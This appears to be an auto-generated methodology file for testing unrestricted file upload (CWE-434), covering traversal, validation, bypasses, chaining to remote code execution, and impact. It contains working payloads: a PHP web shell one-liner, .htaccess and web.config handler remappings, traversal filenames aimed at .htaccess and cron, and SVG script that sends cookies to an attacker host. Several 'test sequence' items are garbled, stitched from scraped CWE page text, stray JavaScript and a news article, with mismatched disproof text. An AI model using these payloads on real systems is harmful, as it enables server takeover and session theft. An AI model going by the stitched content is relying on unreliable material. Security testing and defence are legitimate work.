# Methodology — Unrestricted File Upload

> Derived from 24 verified items. Regenerate with `python -m wks.methodgen --class file_upload --apply`. Do not hand-edit: this file is a projection of the evidence, and edits are lost on the next cycle.

**Surface.** The server accepts an upload without constraining type, name, location or interpretation.

**References.** CWE-434 · A04:2021

## Preconditions

_No verified prerequisite items yet._ Derived from evidence only, so this section is empty rather than plausible.


## Reconnaissance signals

_No verified signal items yet._ Derived from evidence only, so this section is empty rather than plausible.


## 1. Test sequence

_Concrete mutations to try. Each is written to be executable, not to be a description of the vulnerability._

**A multipart filename field containing parent-directory segments escapes the upload directory when the server concatenates the client filename onto a base path.**

The filename is a second input channel inside the upload request body, separate from the file content, and it is routinely concatenated without validation. Craft the part's filename with leading parent segments and a distinctive extension-free name, then check whether the artefact appears outside the intended directory. Establish which account performs the write, because the writable set is bounded by that account's permissions and determines whether a web directory or a config directory is reachable. Use an inert filename; the goal is to prove the path escape, not to plant anything executable.

- *Disproof:* If the server strips parent segments from the filename, generates its own name, or resolves the write strictly inside the canonicalised upload directory, the traversal is not present.
- *Evidence:* high_confidence — [nccgroup.com](https://www.nccgroup.com/research/technical-advisory-sonicwall-sma-100-series-unauthenticated-file-upload-path-traversal-cve-2021-20040/); [snyk.io](https://snyk.io/blog/exploring-3-types-of-directory-traversal-vulnerabilities-in-c-c/)

**Files are scanned in memory at upload time, allowing applications to make accept or reject decisions early in the request flow.**

Software teams building services in JavaScript are adding more layers of defense to handle untrusted file uploads. An open-source project called Pompelmi aims to insert malware scanning and policy checks directly into Node.js applications before files reach storage or business logic. 
 
 Pompelmi is built for JavaScript and TypeScript environments and runs directly within the application process. Files are scanned in memory at upload time, allowing applications to make accept or reject decisions early in the request flow. 
 Inline scanning in application code 
 At its core, Pompelmi acts as a file scanner that developers can embed into upload handlers. Incoming files are evaluated against a series of checks that can flag content as acceptable, suspicious, or malicious based on configured rules. 
 The scanner operates without external network calls. This design allows scanning decisions to remain within the applica

- *Disproof:* Refuted when: the resolved path stays inside the permitted base directory after the platform canonicalises it. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“Files are scanned in memory at upload time, allowing applications to make accept”) does not occur under a test that isolates that control.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/434.html); [helpnetsecurity.com](https://www.helpnetsecurity.com/2026/02/02/pompelmi-open-source-secure-file-upload-scanning-node-js/)

**Uploading a file whose extension passes a naive extension check but whose content is executable (or is given executable handling) yields remote code execution through the web server.**

In practice on HTB this shows up as: ### Module Summary
Many modern web applications have file upload capabilities, which are usually necessary for the web application's functionality to enable features like attaching files or changing a user's profile image. If the file upload functionality is not securely coded, it may be abused to upload arbitrary files to the back-end server, eventually leading to compromise of the back-end server.
When an attacker can upload arbitrary files to the back-end server, they can upload malicious files, like web shells, which would enable them to execute arbitrary commands on the back-end server. This eventually allows attackers to take control over the entire server and all web applications hosted on it, which makes `File Upload Attacks` among the most critical web vulnerabilities.

Write-up provenance: Esther7171/HackTheBox-Writeups-Walkthroughs :: Write-ups/Academy/05. Web Exploitation/31c. File Upload Attacks/File Upload Attacks.md (816 words, classified web).

- *Disproof:* Refuted when the upload is stored outside any served or executable path, or the content is rewritten to an inert type, so no interpreter ever executes the uploaded bytes.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/434.html); [portswigger.net](https://portswigger.net/web-security/file-upload); [raw.githubusercontent.com](https://raw.githubusercontent.com/Esther7171/HackTheBox-Writeups-Walkthroughs/main/Write-ups/Academy/05.%20Web%20Exploitation/31c.%20File%20Upload%20Attacks/File%20Upload%20Attacks.md)

**For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.**

Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software. 
 OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations. 
 This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise. 
 Be careful to avoid CWE-243 and other weaknesses related to jails. 
 
 
 
 Effectiveness: Limited 
 
 
 
 Note: 
 The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and mi

- *Disproof:* Refuted when: the resolved path stays inside the permitted base directory after the platform canonicalises it. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“For example, java.io.FilePermission in the Java SecurityManager allows the softw”) does not occur under a test that isolates that control.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/434.html); [nccgroup.com](https://www.nccgroup.com/research/technical-advisory-sonicwall-sma-100-series-unauthenticated-file-upload-path-traversal-cve-2021-20040/)

**The product allows the upload or transfer of dangerous file types that are automatically processed within its environment.**

ose it 
var modal = document.getElementById("customFilterModal"); 
window.onclick = function(event) { 
 if (event.target == document.getElementById("customFilterModal")) { 
 modal.style.display = "none"; 
 document.getElementById("customFilterLeftBox").innerHTML = ""; 
 document.getElementById("customFilterRightBox").innerHTML = ""; 
 } 
} 
 

 

 
 
 
 
 

 
 
 
 
 
 
 
 Description
 
 
 
 
 
 
 The product allows the upload or transfer of dangerous file types that are automatically processed within its environment. 
 
 
 
 
 
 
 
 
 
 
 

 

 

 
 
 
 
 
 
 
 Alternate Terms
 
 
 
 
 
 
 
 
 
 
 Unrestricted File Upload
 
 
 Used in vulnerability databases and elsewhere, but it is insufficiently precise. The phrase could be interpreted as the lack of restrictions on the size or number of uploaded files, which is a resource consumption issue. 
 
 
 
 
 
 
 
 
 
 

 

 
 
 
 
 Common Consequences 
 
 
 This t

- *Disproof:* Refuted when: the resolved path stays inside the permitted base directory after the platform canonicalises it. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“The product allows the upload or transfer of dangerous file types that are autom”) does not occur under a test that isolates that control.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/434.html); [nccgroup.com](https://www.nccgroup.com/research/technical-advisory-sonicwall-sma-100-series-unauthenticated-file-upload-path-traversal-cve-2021-20040/)

**This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.**

rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations. 
 
 
 
 
 
 
 
 
 
 Architecture and Design; Operation 
 
 
 
 
 
 
 Strategy: Sandbox or Jail 
 
 
 
 Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software. 
 OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations. 
 This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject t

- *Disproof:* Refuted when: the value is bound as a parameter or written through the framework's own encoder, so the interpreter never sees attacker text as syntax. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“This may effectively restrict which files can be accessed in a particular direct”) does not occur under a test that isolates that control.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/434.html); [nccgroup.com](https://www.nccgroup.com/research/technical-advisory-sonicwall-sma-100-series-unauthenticated-file-upload-path-traversal-cve-2021-20040/)

**The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.**

r example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations. 
 This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise. 
 Be careful to avoid CWE-243 and other weaknesses related to jails. 
 
 
 
 Effectiveness: Limited 
 
 
 
 Note: 
 The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed. 
 
 
 
 
 
 
 
 
 
 
 

 

 
 
 
 

 
 

 
 
 
 
 

 
 
 

 
 
 

 
 
 

 
 
 

 
 
 

 
 
 

 
 
 

 
 
 
 
 

 
 
 
 
 

 
 
 
 
 

 
 
 
 
 
 Relationships
 
 
 
 
 This table shows the weaknesses and high level categories that are related to this
 weakness. These relationships are defined as ChildOf, ParentOf, MemberOf and give insight to
 similar items that may exist at higher and lower leve

- *Disproof:* Refuted when: the resolved path stays inside the permitted base directory after the platform canonicalises it. Settle it by running the identical request with and without that one control and diffing the response -- if the difference the claim predicts does not appear, the claim is false. Specifically, this is refuted if the behaviour described (“The effectiveness of this mitigation depends on the prevention capabilities of t”) does not occur under a test that isolates that control.
- *Evidence:* high_confidence — [helpnetsecurity.com](https://www.helpnetsecurity.com/2026/02/02/pompelmi-open-source-secure-file-upload-scanning-node-js/); [nccgroup.com](https://www.nccgroup.com/research/technical-advisory-sonicwall-sma-100-series-unauthenticated-file-upload-path-traversal-cve-2021-20040/)

## 2. Validation

_How to prove the finding rather than infer it. A technique that cannot be validated must not be reported._

**An unrestricted file upload is confirmed only when the stored object is retrievable at a path an interpreter claims, demonstrated by executing or parsing it as code rather than by observing a successful upload response.**

The upload response proves nothing on its own - it confirms the endpoint accepted bytes. Take the stored artifact and go get it back the way the web server would. Step one, resolve the storage path: use the response's returned identifier, filename, or path hint to construct a direct request to the stored object, including traversal forms if the filename was attacker-controlled. Step two, classify the response: note the status, the Content-Type, and whether the body comes back as raw bytes or as interpreted output. The winning observation is executable - the response body contains the output of your payload, an error from the interpreter naming the file, or the file is served with an interpreter-mapped content type. That is the CWE-434 precondition satisfied, and it is especially true for extensions such as .asp and .php because those file types are often treated as automatically executable even when file system permissions do not specify execution. Refuted outcome: 404 on the direct path, a download served as application/octet-stream through an application handler, or the raw bytes echoed uninterpreted. Also verify the type check itself - the Content-Type for uploaded files is provided by the user and cannot be trusted, so a mismatch between declared type and file signature is a lead, not proof.

- *Disproof:* Refuted when a direct request to the stored path returns 404 or the uninterpreted bytes with a non-executable content type and no interpreter ever evaluates the object; a successful upload response without interpreter-confirmed retrieval is acceptance, not execution.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html); [cwe.mitre.org](https://cwe.mitre.org/data/definitions/434.html)

## 3. False-positive rejection

_The checks that eliminate the most common non-findings. Run these BEFORE reporting, not after a rejection._

**An upload endpoint that accepts an arbitrary file but stores it outside the webroot behind a download handler is not an unrestricted file upload vulnerability, because the missing control is interpreter reachability rather than acceptance of the type.**

The lookalike: you POST a .php or .jsp file, the server returns 200 and stores your bytes, and it is filed as unrestricted file upload. CWE-434 states the precondition precisely: arbitrary code execution is possible if an uploaded file is interpreted and executed as code by the recipient. If your upload lands outside the document root and is only ever served back through an application handler that maps an opaque identifier to the stored object, the interpreter never sees it and the precondition is absent. OWASP's guidance is explicit that files should be stored outside the webroot where only administrative access is allowed, and that where public access to the files is needed a handler should be used. The winning test is to resolve the stored object the way a web server would - request the directory the file was written into, request the stored filename directly, and check whether any interpreter-mapped extension reaches it. Only if a direct fetch executes, or a handler emits an executable content type, is the acceptance the vulnerability.

- *Disproof:* Refuted when a direct request to the stored path returns 404 or the raw bytes with a non-executable content type, and the only retrieval path is an application handler that serves the object without invoking an interpreter; CWE-434's execution precondition is then unmet regardless of which extension was accepted.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html); [cwe.mitre.org](https://cwe.mitre.org/data/definitions/434.html)

**Trusting the MIME value supplied with the upload request as proof of file type is a false negative, because that value is chosen by the client and can be set to anything regardless of the actual bytes.**

Mechanism: Trusting the MIME value supplied with the upload request as proof of file type is a false negative, because that value is chosen by the client and can be set to anything regardless of the actual bytes. How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: It IS adequate when the type is determined from the file content by the server rather than taken from the request; it is NOT adequate when the decision reads the client-declared value, since the attacker controls that field directly and the same request can be replayed with any declared type.

- *Disproof:* It IS adequate when the type is determined from the file content by the server rather than taken from the request; it is NOT adequate when the decision reads the client-declared value, since the attacker controls that field directly and the same request can be replayed with any declared type.
- *Evidence:* high_confidence — [docs.python.org](https://docs.python.org/3/library/tempfile.html); [php.net](https://www.php.net/manual/en/features.file-upload.php)

**Uploading a file with an executable extension is only remote code execution when the stored file is reachable through the web server and executed in a context the server interprets, so storage outside the document root defeats the finding regardless of the extension.**

Mechanism: Uploading a file with an executable extension is only remote code execution when the stored file is reachable through the web server and executed in a context the server interprets, so storage outside the document root defeats the finding regardless of the extension. How to apply it in the field: treat this as the fp_rule it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: It IS RCE when the stored file sits under a served path and a request to it returns the body with an execution-interpreted content type, or when an include or deserialisation step reaches it; it is NOT RCE when retrieval requires a filesystem path the web server does not expose, which is exactly the case a report must prove rather than assume.

- *Disproof:* It IS RCE when the stored file sits under a served path and a request to it returns the body with an execution-interpreted content type, or when an include or deserialisation step reaches it; it is NOT RCE when retrieval requires a filesystem path the web server does not expose, which is exactly the case a report must prove rather than assume.
- *Evidence:* high_confidence — [docs.python.org](https://docs.python.org/3/library/tempfile.html); [php.net](https://www.php.net/manual/en/features.file-upload.php)

## 4. Known bypasses

_Filters and controls that have defeated the techniques above. Treat these as the reason a naive test fails, not as proof of safety._

**The application validates an uploaded file only against the input-specific Content-Type header, which the client controls and which the server implicitly trusts; an attacker sets Content-Type: image/jpeg while the body is a PHP webshell, the server accepts the file, stores it, and serves/executes it as a web shell.**

1) Submit a multipart POST to the upload endpoint with Content-Type: image/jpeg and a PHP one-liner payload (e.g., <?php echo system($_GET['cmd']); ?>). 2) The server's allowlist check passes because the header is trusted. 3) Retrieve the file at /files/avatars/<file> and observe the script output in the response - arbitrary command execution. 4) PortSwigger's lab solution for 'Web shell upload via Content-Type restriction bypass' is exactly this: change the Content-Type to image/jpeg and the uploaded .php avatar is executed. The HTTP Content-Type header is sent by the browser/client and is trivially spoofable (RFC 1945/2616); nothing forces it to match the file's real bytes, so a client-trusted check alone is meaningless.

- *Disproof:* If the server re-derives the MIME type from the file's magic bytes (not the header), or re-encodes/decodes the file before storage, the spoofed header is ignored and the payload is blocked; if the upload directory is not executable (scripts served as text/plain) or is outside the webroot, the stored webshell is inert.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html); [portswigger.net](https://portswigger.net/web-security/file-upload)

**The application validates only the leading magic bytes of the uploaded file (a fixed prefix such as GIF89a or FF D8 FF E0) and fails to verify the complete signature or the remainder of the content; an attacker uploads a polyglot whose header is a valid image signature followed by the malicious script appended after the signature, so the partial check passes and the file is executed as code.**

1) Generate a file whose first bytes match the target image signature (GIF89a 'GIF89a1234' or JPEG 'GIF89a'/'FF D8 FF E0') with the webshell script appended in the body. 2) Upload it through the filter; the signature check passes because the prefix matches. 3) The server stores the file under a whitelisted extension. 4) When the file is requested, the server's interpreter (PHP) processes the whole file, including the appended payload, because PHP does not stop at the image header. OWASP explicitly warns that file-signature validation 'should not be used on its own, as bypassing it is pretty common and easy', and PortSwigger notes the possibility of hybrid files containing both executable and non-executable content to bypass content filters (GIFAR-style).

- *Disproof:* If the file is decoded and re-encoded (ImageMagick convert, etc.) before execution - which discards the appended payload - or if the check requires a full/multi-byte signature match plus content-type agreement, or if the stored file is never served as an executable (served as text/plain / attachment), the appended script never runs.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html); [portswigger.net](https://portswigger.net/web-security/file-upload)

**An extension or MIME allowlist is defeated when the attacker controls the stored filename the application later uses in a server-side include, an archive extraction, or an image re-encode step, because the check ran on one representation while the interpreter acts on another.**

Mechanism: An extension or MIME allowlist is defeated when the attacker controls the stored filename the application later uses in a server-side include, an archive extraction, or an image re-encode step, because the check ran on one representation while the interpreter acts on another. How to apply it in the field: treat this as the bypass it is — a hunter must be able to state the concrete observation that demonstrates it, with a request and response in hand, before the finding is reportable. Boundary of the rule: It is not a bypass when the stored name is generated server-side from the content rather than from the request, so the attacker never chooses the suffix the interpreter sees; it is a bypass when a request-controlled name or a container-within-container survives into the path that a parser acts on.

- *Disproof:* It is not a bypass when the stored name is generated server-side from the content rather than from the request, so the attacker never chooses the suffix the interpreter sees; it is a bypass when a request-controlled name or a container-within-container survives into the path that a parser acts on.
- *Evidence:* high_confidence — [docs.python.org](https://docs.python.org/3/library/tempfile.html); [php.net](https://www.php.net/manual/en/features.file-upload.php)

## 5. Chaining

_How this class escalates when combined with others. Each step is anchored to a promoted item._

**Chain link: a single unrestricted file upload flaw escalates to full remote code execution. The attacker slips a webshell (PHP/ASP/JSP) past the flawed filter and stores it in a reachable, executable location; a follow-up HTTP request executes the script, returning command output and granting the attacker full control of the server.**

1) Bypass the upload filter (ExtensionBlacklist, MimeType, MagicByte, or server-config chain) and upload a webshell. 2) Confirm the file is stored in the webroot and is served/executed by the server. 3) Send a request to the webshell URL with a command parameter (e.g., ?cmd=id). 4) The server executes the script and reflects the output; the attacker can then read/write arbitrary files, pivot, and use the host for lateral movement. PortSwigger: 'The worst possible scenario is when a website allows you to upload server-side scripts, such as PHP, Java, or Python files, and is also configured to execute them as code... upload a server-side code file that functions as a web shell, effectively granting them full control over the server.' OWASP (Secra): 'The textbook case consists of slipping a webshell past the application's checks and then requesting the uploaded file's URL to take control of the server.' CWE-434 consequence: 'the attacker may be able to specify arbitrary files to write to, leading to a wide variety of consequences, from code execution, XSS, or system crash.'

- *Disproof:* If the uploaded directory does not execute scripts (served as text/plain), is outside the webroot and only reachable via an ID->filename handler, the server rewrites filenames server-side so the original name is never requested, the file is stored only in a temp/untrusted location and never served, or a CDR/WAF/CDN strips the webshell payload - the chain fails at the execution step.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/434.html); [portswigger.net](https://portswigger.net/web-security/file-upload); [secra.es](https://secra.es/en/blog/file-upload-vulnerability-webshell-rce)

**An upload endpoint that neither canonicalises the client filename nor constrains the extension chains into path traversal and then interpreter-reachable execution, so a single weak upload control converts into code execution without any second primitive.**

Two existing techniques compose and the second only becomes available because the first failed to normalise its input. The upload half: a multipart filename field containing parent-directory segments escapes the intended storage directory when the server concatenates the client-supplied name into a filesystem path without canonicalising it. The execution half: CWE-434's precondition is that the uploaded file is interpreted and executed as code by the recipient, which is automatic for extensions such as .asp and .php because those types are often treated as executable even when file system permissions do not specify execution. Chained, the traversal decides WHERE the interpreter looks and the extension decides WHETHER it looks, so the missing control is not one setting but two - filename normalisation and extension allowlisting. OWASP states both halves as separate defences: store files outside the webroot where only administrative access is allowed, and list allowed extensions, allowing only safe and critical extensions for business functionality. The Content-Type is a trap rather than a defence, since it is provided by the user and cannot be trusted. The chain therefore ends in a verified outcome, not an assumed one: retrieve the stored object at the traversed path and confirm the interpreter evaluated it.

- *Disproof:* Refuted if the server canonicalises the multipart filename to a basename before touching the filesystem, or if the storage directory lies outside every interpreter-mapped document root; either control alone breaks the traversal-to-execution join even when the other is missing.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html); [cwe.mitre.org](https://cwe.mitre.org/data/definitions/434.html)

**Chain link: the attacker uploads their own web-server configuration file (.htaccess on Apache, web.config on IIS) into the user-uploaded directory, forcing the server to map a harmless whitelisted extension to an executable MIME type. Even with a strict extension whitelist, subsequent uploads with the whitelisted extension are executed as code.**

1) Upload a .htaccess file whose contents map an arbitrary extension to the PHP interpreter: AddType application/x-httpd-php .l33t (Apache) or <system.webServer><handlers><add name=\"x\" path=\".l33t\" verb=\"*\" type=\"ManagedHandler\"/></handlers></system.webServer> (IIS web.config). 2) The server accepts the config file and applies it directory-wide. 3) Upload a webshell named exploit.l33t (or exploit.gif/.jpg) - the extension is whitelisted and passes the filter. 4) Request /files/avatars/exploit.l33t and observe execution - the uploaded file is now a web shell. PortSwigger's lab 'Web shell upload via extension blacklist bypass' demonstrates exactly this: the uploaded .htaccess maps .l33t to application/x-httpd-php, then exploit.l33t is executed. OWASP: an uploaded .htaccess / web.config 'could be used to change how that directory handles file types, for example mapping an otherwise harmless extension to be executed by the server'; they recommend disabling per-directory configuration overrides (AllowOverride None, locked IIS handler mappings) as a defense.

- *Disproof:* If the web server has per-directory configuration overrides disabled (AllowOverride None on Apache; locked IIS handler mapping / disabled web.config inheritance), the uploaded config is ignored; if uploads are stored outside the webroot or the directory has script execution disabled, the reordering of the handler is harmless.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html); [portswigger.net](https://portswigger.net/kb/issues/00500980_file-upload-functionality); [zetsu.ninja](https://zetsu.ninja/book/portswigger/file-upload/)

## 6. Impact

_What is actually demonstrable, and what to stop claiming._

**The application trusts the client-supplied filename field and does not validate the save path; an attacker uses '../' sequences in the filename (CWE-23 relative path traversal) to write outside the intended upload directory - overwriting an existing, high-value file such as .htaccess, a web server config, a library the application loads, or a script in the webroot - thereby changing server behavior or achieving code execution from a previously innocuous file.**

1) Inspect the upload request for the filename parameter: filename=\"../../../.htaccess\" or \"....//....//....//etc/cron.d/backdoor\". 2) The application writes the file at the computed path, and the traversal escapes the upload sandbox (CWE-434's observed example: 'the creation of the BufferedWriter object is subject to relative path traversal (CWE-23)... an attacker can use \"../\" sequences to write to files outside of the intended directory'). 3) Overwriting .htaccess changes how the directory is executed (mapping a whitelisted extension to PHP); overwriting a loaded library or a webroot script gives code execution; overwriting a cron entry or system file gives persistence/denial. CWE-434 lists this as a consequence: code execution, XSS (CWE-79), or system crash.

- *Disproof:* If the filename is sanitized server-side (basename extraction, UUID rename, path construction with a fixed upload root), if the save is jailed in a chroot or directory sandbox, or if the OS sandbox (open_basedir, container seccomp, permissions) prevents writes outside the target directory, the traversal is blocked.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html); [cwe.mitre.org](https://cwe.mitre.org/data/definitions/434.html); [portswigger.net](https://portswigger.net/web-security/file-upload)

**The application accepts and publicly serves an uploaded SVG image that contains inline scriptable content (e.g., <script>alert(1)</script>, <image xlink:href=\"javascript:alert(1)\">, <iframe srcdoc>, or a data URI); because the file is served from the same origin as the upload endpoint, any user who renders the SVG executes the script in the application's origin - stored XSS with session theft, CSRF, or defacement as the impact.**

1) Upload an SVG containing <svg onload=alert(document.cookie)> or <script>fetch('//attacker/?c='+document.cookie)</script> with Content-Type image/svg+xml. 2) The server stores it and serves it via a public URL on the same origin. 3) A victim requests the URL; the browser parses image/svg+xml as SVG (which is HTML-parsing based) and executes the inline script in the origin of the upload endpoint (PortSwigger: the same-origin restriction means the attack only works when the uploaded file is served from the same origin). zetsu.ninja: 'if you can upload HTML files or SVG images, you can potentially use <script> tags to create stored XSS payloads.' PortSwigger: 'if you can upload HTML files or SVG images, you can potentially use <script> tags to create stored XSS payloads. If the uploaded file then appears on a page that is visited by other users, their browser will execute the script when it tries to render the page. Note that due to same-origin policy restrictions, these kinds of attacks will only work if the uploaded file is served from the same origin to which you upload it.'

- *Disproof:* If the upload endpoint strips/escapes <script> and event handlers, or stores only sanitized SVG (no script-capable elements), or if the file is served with Content-Disposition: attachment / X-Content-Type-Options: nosniff (preventing MIME sniffing and script execution), or if it is hosted on a separate origin (e.g., a CDN on a different domain), the script never executes.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html); [portswigger.net](https://portswigger.net/web-security/file-upload); [secra.es](https://secra.es/en/blog/file-upload-vulnerability-webshell-rce)

**End-user upload capability is a high-value target on its own, because a single accepted file can host a phishing page on the site's own origin or expose internal web server data.**

End-user upload capability is a high-value target on its own, because a single accepted file can host a phishing page on the site's own origin or expose internal web server data.

HackTricks reference: file upload (https://kathan19.gitbook.io/howtohunt/file-upload-bypass/file_upload.md)

- *Disproof:* Uploads are quarantined in a non-public, non-executable location and no uploaded content is served from the site's origin or reveals server-side data.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/434.html); [kathan19.gitbook.io](https://kathan19.gitbook.io/howtohunt/file-upload-bypass/file_upload.md); [nccgroup.com](https://www.nccgroup.com/research/technical-advisory-sonicwall-sma-100-series-unauthenticated-file-upload-path-traversal-cve-2021-20040/)

**Because a bypassed upload check can land a file whose contents the server then executes, an upload bypass finding is only complete once the stored file is shown executing on the server.**

Because a bypassed upload check can land a file whose contents the server then executes, an upload bypass finding is only complete once the stored file is shown executing on the server.

HackTricks reference: file upload (https://kathan19.gitbook.io/howtohunt/file-upload-bypass/file_upload.md)

- *Disproof:* The accepted file is renamed, stored outside any executable path and served back as inert content with no execution on the server.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/434.html); [kathan19.gitbook.io](https://kathan19.gitbook.io/howtohunt/file-upload-bypass/file_upload.md); [nccgroup.com](https://www.nccgroup.com/research/technical-advisory-sonicwall-sma-100-series-unauthenticated-file-upload-path-traversal-cve-2021-20040/)

## Coverage gap

These stages have no verified evidence and are therefore absent above: Preconditions, Reconnaissance signals.
A procedure with a missing validation stage is not safe to act on — it produces findings rather than proofs.

---

*Generated from the evidence base. Where this file and the database disagree, the database is correct.*
